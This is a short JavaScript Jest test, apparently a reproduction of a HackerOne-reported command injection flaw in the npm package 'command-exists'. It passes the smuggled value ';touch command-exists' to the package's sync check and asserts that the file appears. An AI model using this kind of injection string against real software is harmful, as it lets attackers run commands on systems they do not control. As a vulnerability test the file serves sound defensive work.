//https://hackerone.com/reports/324453
test("Command Injection in command-exists", () => {
  expect.assertions(2);
  const commandExists = require("command-exists");
  const fs = require("fs");
  const path = "./command-exists";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  commandExists.sync(";touch command-exists");
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
